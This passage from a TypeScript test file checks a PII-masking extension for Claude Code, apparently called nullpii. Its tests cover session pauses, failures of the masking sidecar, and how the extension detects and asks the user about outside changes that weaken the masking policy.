  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  // The sidecar stops answering: a prompt cannot be masked, so nothing goes
  // out, and the line says so.
  sidecar.state.garbage = GARBAGE;
  await $.prompt.submit({ text: 'Mail John at john@acme.io', wait: false, origin: COMPOSER });
  expect(lines.at(-1)).toBe('⚠ blocking · the sidecar sent a bad answer');
  // Pausing now changes nothing about what goes out — a pause sends unmasked,
  // a broken sidecar sends nothing at all — so the line still reads blocking.
  await $.command.run(typed('pii', 'pause'));
  expect(questions).toHaveLength(1);
  expect(lines.at(-1)).toBe('⚠ blocking · the sidecar sent a bad answer');
});

test('a pause confirmed after its session ended pauses nothing in the next one', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  let release: () => void = () => undefined;
  const gate = new Promise<void>((resolve) => {
    release = resolve;
  });
  on('tool.call', { tool: 'AskUserQuestion' }, async ($, e) => {
    const question = e.questions[0]?.question ?? '';
    await gate;
    return { result: { questions: e.questions, answers: { [question]: 'Pause masking' } } };
  });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.status', () => ({ value: undefined }));
  await start($);
  // The person types /pii pause; its dialog stays open while the session
  // ends and another begins.
  const pausing = $.command.run(typed('pii', 'pause'));
  sidecar.sessions.delete('session-1');
  await start($);
  release();
  await new Promise((resolve) => setTimeout(resolve, 0));
  const prompt = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(prompt.text).not.toContain('john@acme.io');
  expect((await pausing).text).toContain('Masking stays on');
});

test('a start-up answer given after its start ended arms nothing in the next one', async ($, on) => {
  const { sent, clock } = stillStarting($, on);
  let release: () => void = () => undefined;
  const gate = new Promise<void>((resolve) => {
    release = resolve;
  });
  on('tool.call', { tool: 'AskUserQuestion' }, async ($, e) => {
    const question = e.questions[0]?.question ?? '';
    await gate;
    return {
      result: {
        questions: e.questions,
        answers: { [question]: 'Send now, and do not ask again until nullpii is ready' },
      },
    };
  });
  await start($);
  const pending = $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  // That start ends and another begins before the answer comes.
  await start($);
  release();
  await clock.advance(6 * 60_000);
  const out = await pending;
  expect(out.drop).toBeDefined();
  expect(sent).toEqual([]);
});

test('a start-up report that is not an object is not read as ready, and polling goes on', async ($, on) => {
  const { sidecar, opts, clock } = stillStarting($, on);
  await start($);
  opts.down = false;
  sidecar.state.startup = null as never;
  await clock.advance(4_000);
  sidecar.state.startup = { phase: 'ready' };
  await clock.advance(4_000);
  const out = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(out.drop).toBeUndefined();
  expect(out.text).not.toContain('john@acme.io');
});

test('a pause ends with its session: the next one starts masked, and the policy file is never touched', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const questions: string[] = [];
  answerDialog(on, 'Pause masking', questions);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  await $.command.run(typed('pii', 'pause'));
  expect(questions).toHaveLength(1);
  expect(
    await ui.find({
      type: 'Text',
      text: 'paused · everything you send reaches Claude unmasked',
    }),
  ).toBeDefined();

  // The pause was this session's alone, in memory: the policy file was never
  // written for it.
  expect(sidecar.policyBodies).toEqual([]);
  // The next session starts masked again, on its own: the sidecar has no
  // session left under that key, as when a new Claude Code session opens.
  sidecar.sessions.delete('session-1');
  await start($);
  // Masking again, so the band has nothing left to say.
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();
  const prompt = await $.prompt.submit({
    text: 'Mail John at john@acme.io',
    wait: false,
    origin: COMPOSER,
  });
  expect(prompt.text).not.toContain('john@acme.io');
  await ui.unmount();
});

test('a policy changed outside the session is put to the user before anything runs under it: kept on their word', async ($, on) => {
  const sidecar = fakeSidecar({ categories: { private_person: 'mask' } });
  stubSession(on, sidecar);
  const questions: string[] = [];
  answerDialog(on, 'Keep the change', questions);
  const sent: string[] = [];
  on('prompt.submit', ($, e) => {
    sent.push(e.text);
    return { text: e.text };
  });
  await start($);
  // A command holding only the token turns names off and adds a web tool.
  sidecar.replacePolicy({
    categories: { private_person: 'off' },
    restoreTools: [...DEFAULT_RESTORE_TOOLS, 'WebFetch'],
  });

  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });

  expect(sidecar.statuses).toContain(412);
  expect(questions).toHaveLength(1);
  expect(questions[0]).toContain('person mask → off');
  expect(questions[0]).toContain('real values now go back into WebFetch');
  expect(sent).toHaveLength(1);
  expect(sidecar.policyBodies).toEqual([]);
});

/** Wait until `done` holds, letting the mod's own promise chain run on: a
 * turn of the event loop at a time, as a machine under load needs. */
async function flushUntil(done: () => boolean): Promise<void> {
  for (let i = 0; i < 50 && !done(); i++) {
    await new Promise((resolve) => setTimeout(resolve, 0));
  }
}

test('while a policy change is being settled, the band is up with no button: only a pause has one', async ($, on) => {
  const sidecar = fakeSidecar({ categories: { private_person: 'mask' } });
  stubSession(on, sidecar);
  /** Answer the review dialog the moment the test says so: until then the
   * change is still being settled, as while its question is on screen. */
  let settle: (() => void) | undefined;
  on('tool.call', { tool: 'AskUserQuestion' }, ($, e) => {
    const question = e.questions[0]?.question ?? '';
    return new Promise((resolve) => {
      settle = () =>
        resolve({
          result: { questions: e.questions, answers: { [question]: 'Keep the change' } },
        });
    });
  });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  const ui = await $.ui.mount(BAND);
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();

  // A command holding only the token turns names off.
  sidecar.replacePolicy({ categories: { private_person: 'off' } });
  const pending = $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  await flushUntil(() => settle !== undefined);
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();

  // Settled on the person's word, and nothing left to review: the band has
  // nothing to say any more, and the state is the line under the prompt.
  settle?.();
  await pending;
  expect(await ui.find({ type: 'Button', key: 'nullpii-toggle' })).toBeUndefined();
  await ui.unmount();
});

test('a policy changed outside the session is put back unless the user keeps it, before a tool gets values', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const questions: string[] = [];
  answerDialog(on, 'Put back the previous policy', questions);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', { tool: 'WebFetch' }, ($, e) => ({ result: { fetched: e.url } }));
  await start($);
  await $.prompt.submit({ text: 'John', wait: false, origin: COMPOSER });
  sidecar.replacePolicy({ restoreTools: [...DEFAULT_RESTORE_TOOLS, 'WebFetch'] });

  const out = await $.tool.call({ tool: 'WebFetch', url: `https://x.test/?q=${ph('PERSON', 0)}` });

  expect(questions).toHaveLength(1);
  expect(sidecar.policyBodies).toEqual([{}]);
  expect(JSON.stringify(out)).toContain(ph('PERSON', 0));
  expect(JSON.stringify(out)).not.toContain('John');
});

test('/pii applies its change to the policy as it is now, not to the copy read at session start', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  answerDialog(on, 'Keep the change', []);
  await start($);
  // Another session masks dates meanwhile.
  sidecar.replacePolicy({ categories: { private_date: 'mask' } });

  const answer = await $.command.run({ command: 'pii', args: 'allow title' });

  expect(answer.text).toContain('Policy changed.');
  expect(sidecar.policyBodies).toEqual([
    { categories: { private_date: 'mask', private_title: 'off' } },
  ]);
});

test('a policy changed between sessions is put to the user when the next one opens', async ($, on) => {
  const accepted = {
    version: 'v-earlier',
    file: POLICY_FILE,
    loaded: true,
    config: { categories: { private_person: 'mask' } },
    categories: { private_person: 'mask' },
    restoreTools: DEFAULT_RESTORE_TOOLS,
  };
  const sidecar = fakeSidecar({
    categories: { private_person: 'off' },
    stored: { acceptedPolicy: accepted },
  });
  stubSession(on, sidecar);
  const questions: string[] = [];
  answerDialog(on, 'Put back the previous policy', questions);
  await start($);

  expect(questions).toHaveLength(1);
  expect(questions[0]).toContain('since your last session');
  expect(questions[0]).toContain('person mask → off');
  expect(sidecar.policyBodies).toEqual([accepted.config]);
});

test('a change that masks less is spelled out with its values, and putting it back is the first option', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const asked: { question: string; options: string[] }[] = [];
  /** Answer the policy-change dialog, and leave every other dialog
   * unanswered: the `/pii` menu is then dismissed, which prints the status. */
  on('tool.call', { tool: 'AskUserQuestion' }, ($, e) => {
    const q = e.questions[0];
    const question = q?.question ?? '';
    if (!question.startsWith('The nullpii masking policy was changed'))
      return { deny: 'dismissed' };
    asked.push({ question, options: (q?.options ?? []).map((o) => o.label) });
    return {
      result: { questions: e.questions, answers: { [question]: 'Put back the previous policy' } },
    };
  });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'one', wait: false, origin: COMPOSER });
  // A command holding only the token raises every cut to 1 and opens a host.
  sidecar.replacePolicy({
    threshold: 1,
    urlAllowlist: { hosts: { 'paste.example.com': 'full' } },
  });

  await $.prompt.submit({ text: 'two', wait: false, origin: COMPOSER });

  expect(asked).toHaveLength(1);
  expect(asked[0]?.question).toContain('threshold default → 1');
  expect(asked[0]?.question).toContain('URLs on paste.example.com default → full');
  expect(asked[0]?.question).toContain('This change masks less');
  expect(asked[0]?.options[0]).toBe('Put back the previous policy');
  const report = await $.command.run({ command: 'pii', args: '' });
  expect(report.text).toContain('Confidence cuts: defaults');
});

test('after a sidecar restart with another policy, the change is put to the user once', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const questions: string[] = [];
  answerDialog(on, 'Keep the change', questions);
  const sent: string[] = [];
  on('prompt.submit', ($, e) => {
    sent.push(e.text);
    return { text: e.text };
  });
  await start($);
  await $.prompt.submit({ text: 'one', wait: false, origin: COMPOSER });
  // The sidecar restarts (sessions gone) with a policy edited by hand.
  sidecar.sessions.clear();
  sidecar.replacePolicy({ threshold: 0.9 });

  await $.prompt.submit({ text: 'two', wait: false, origin: COMPOSER });

  expect(questions).toHaveLength(1);
  expect(questions[0]).toContain('threshold default → 0.9');
  expect(questions[0]).toContain('This change masks less');
  expect(sent).toEqual(['one', 'two']);
});

/** The padlock's cells as the raster takes them: triplets of code point,
 * foreground and background, row by row. */
function cellsOf(open: boolean): number[][] {
  const bytes = Uint8Array.fromBase64(padlockCells(open, 'teal'));
  const words = new Uint32Array(bytes.buffer);
  const cells: number[][] = [];
  for (let at = 0; at < words.length; at += 3) cells.push([...words.slice(at, at + 3)]);
  return cells;
}

test('the open padlock is the closed one with the shackle cut a pixel short on one side', () => {
  const closed = cellsOf(false);
  const open = cellsOf(true);
  expect(open).toHaveLength(closed.length);
  const differing = closed.flatMap((cell, at) =>
    cell.some((word, i) => word !== open[at]?.[i]) ? [at] : [],
  );
  // One cell only, in the upper row, under the arch's right end.
  expect(differing).toEqual([2]);
  expect(PADLOCK_COLUMNS).toBe(3);
});
